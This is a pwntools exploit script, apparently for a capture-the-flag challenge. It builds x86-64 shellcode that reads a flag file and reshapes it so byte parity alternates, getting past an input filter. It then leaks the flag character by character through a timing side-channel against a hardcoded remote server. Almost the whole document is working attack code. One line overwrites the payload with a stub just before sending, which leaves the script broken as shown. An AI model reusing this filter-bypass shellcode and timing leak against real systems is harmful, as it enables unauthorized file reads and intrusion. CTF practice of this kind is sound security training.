from pwn import *
import string
import time
s='ops'+string.ascii_letters+string.digits+'{}_!+ '
context(os='linux', arch='amd64')
#p=remote("111.186.57.85",40245)
def show(payload):
    print(len(payload),payload)
    a=[]
    for each in payload:
        a.append(each%2)
    print(a)
payload=b'hflagH\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_jdZH\x89\xe6\x0f\x05\x80<$\xfft\xfa'
def add_rax(val):#val为奇数
    return b'H\x83\xc0'+p8(val)
def inc_rax(dist):#dist为奇数，修改[rax+dist+1]
    return b'f\x81@'+p8(dist)+b'\x00\x01'
def prune(payload):
    ans=b''
    a=[]
    for i in range(len(payload)):
        if payload[i]%2!=i%2:
            a.append(i)
            ans+=p8((payload[i]-1)%256)
        else:
            ans+=p8(payload[i])
    for length in range(20,400,2):
        newpayload=b''
        rax=-length
        for each in a:
            while each-rax>130:
                newpayload+=add_rax(127)
                rax+=127
            if each-rax>128:
                newpayload+=add_rax(63)
                rax+=63
            if (each-rax)%2==1:
                newpayload+=add_rax(1)
                rax+=1
            newpayload+=inc_rax(each-rax-1)
        if len(newpayload)==length:
            return newpayload+ans
def check(payload):
    assert(len(payload))<512
    for i in range(len(payload)):
        if payload[i]%2!=i%2:
            a=[]
            print(payload)
            for each in payload:
                a.append(each%2)
            print(a)
            exit(0)
idx=1
flag='0'
while flag[-1]!='}':
    for each in s:
        payload= b'H\x81\xec\xc8\x00\x00\x00hflagH\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_jdZH\x89\xe6\x0f\x05\x80|$'+p8(idx)+p8(ord(each))+b't\xf9\xc3'
        payload=prune(payload)
        payload=b'\x90\xc3'
        check(payload)
        beg=time.time()
        with remote("111.186.57.85",40245) as p:
            print(p.recvuntil("shellcode"))
            p.send(payload)
            p.wait()
        ed=time.time()
        print(ed-beg)
        if ed-beg>1:
            flag+=each
            break
    print(flag)
    idx+=1
